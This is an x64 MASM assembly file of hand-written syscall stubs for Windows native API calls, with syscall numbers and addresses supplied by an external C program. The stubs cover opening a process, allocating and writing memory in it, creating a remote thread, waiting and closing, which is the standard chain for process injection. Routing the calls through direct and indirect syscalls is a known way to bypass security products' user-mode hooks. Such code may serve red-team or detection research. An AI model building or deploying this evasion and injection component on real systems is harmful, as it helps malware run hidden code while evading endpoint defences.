.data ; use this section to declare and reference external data

;Obtain the SSN and Syscall address from our C program
EXTERN NtOpenProcessSSN:DWORD          
EXTERN NtOpenProcessSyscall:QWORD

EXTERN NtAllocateVirtualMemorySSN:DWORD
EXTERN NtAllocateVirtualMemorySyscall:QWORD

EXTERN NtWriteVirtualMemorySSN:DWORD
EXTERN NtWriteVirtualMemorySyscall:QWORD  

EXTERN NtWaitForSingleObjectSSN:DWORD
EXTERN NtWaitForSingleObjectSyscall:QWORD  

EXTERN NtCreateThreadExSSN:DWORD       
EXTERN NtCreateThreadExSyscall:QWORD 

EXTERN NtCloseSSN:DWORD
EXTERN NtCloseSyscall:QWORD

.code

NtOpenProcess proc
		mov r10, rcx
		mov eax, NtOpenProcessSSN       
		jmp qword ptr [NtOpenProcessSyscall]
		ret                             
NtOpenProcess endp

NtAllocateVirtualMemory proc
		mov r10, rcx
		mov eax, NtAllocateVirtualMemorySSN      
		syscall                        
		ret                             
NtAllocateVirtualMemory endp

NtWriteVirtualMemory proc
		mov r10, rcx
		mov eax, NtWriteVirtualMemorySSN      
		syscall                        
		ret                             
NtWriteVirtualMemory endp

NtCreateThreadEx proc
		mov r10, rcx
		mov eax, NtCreateThreadExSSN      
		syscall                        
		ret                             
NtCreateThreadEx endp

NtWaitForSingleObject proc
		mov r10, rcx
		mov eax, NtWaitForSingleObjectSSN      
		syscall                        
		ret                             
NtWaitForSingleObject endp

NtClose proc
		mov r10, rcx
		mov eax, NtCloseSSN      
		syscall                        
		ret                             
NtClose endp
end